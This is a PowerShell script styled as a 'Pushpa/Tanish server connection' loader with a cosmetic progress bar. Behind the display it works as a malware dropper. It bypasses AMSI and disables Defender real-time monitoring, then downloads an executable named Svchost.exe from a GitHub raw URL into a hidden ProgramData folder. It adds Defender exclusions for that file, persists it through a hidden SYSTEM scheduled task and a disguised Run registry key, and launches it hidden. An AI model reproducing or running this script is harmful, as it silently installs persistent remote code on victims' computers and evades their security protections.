# ============================================
# PUSHPA SERVER CONNECTION v2.0
# ============================================

try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ============================================
# CREATE HIDDEN FOLDER
# ============================================
$folder = "$env:ProgramData\Intel\DriverCache"
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}
Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

$name = -join ((65..90) | Get-Random -Count 8 | ForEach-Object {[char]$_}) + ".exe"
$path = Join-Path $folder $name

# ============================================
# LOADER PROGRESS
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    TANISH SERVER CONNECTION                  ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Progress function
function Show-Progress {
    param($step, $total, $message)
    $percent = [math]::Round(($step / $total) * 100)
    $bar = ""
    for ($i = 0; $i -lt 50; $i++) {
        if ($i -lt ($percent / 2)) { $bar += "█" } else { $bar += "░" }
    }
    Write-Host "  [$bar] $percent%  " -NoNewline
    Write-Host "- $message" -ForegroundColor Yellow
}

# Step 1
Show-Progress -step 1 -total 6 -message "Initializing connection..."
Start-Sleep -Milliseconds 500

# Step 2 - Download
Show-Progress -step 2 -total 6 -message "Downloading driver updates..."
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
    if (!(Test-Path $path)) { throw "Download failed" }
} catch {
    Write-Host "  [✗] Download failed! Exiting..." -ForegroundColor Red
    exit
}

# Step 3
Show-Progress -step 3 -total 6 -message "Configuring security exclusions..."
Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue

# Step 4
Show-Progress -step 4 -total 6 -message "Setting up auto-start..."

# Scheduled Task
$action = New-ScheduledTaskAction -Execute $path
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "IntelDriverUpdate" -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Registry Run
$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue

# Step 5
Show-Progress -step 5 -total 6 -message "Starting application..."
Start-Process -FilePath $path -WindowStyle Hidden

# Step 6 - Countdown
Show-Progress -step 6 -total 6 -message "Finalizing..."
Write-Host ""
Write-Host "  ⏳ Waiting for initialization (25 seconds)..." -ForegroundColor Gray

for ($i = 25; $i -ge 1; $i--) {
    Write-Host "`r  ⏳ $i seconds remaining..." -NoNewline -ForegroundColor Gray
    Start-Sleep -Seconds 1
}
Write-Host ""

# ============================================
# DEFENDER BACK ON
# ============================================
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

# ============================================
# DONE
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║         ✓ YOU ARE NOW CONNECTED TO TANISH SERVER            ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""


exit
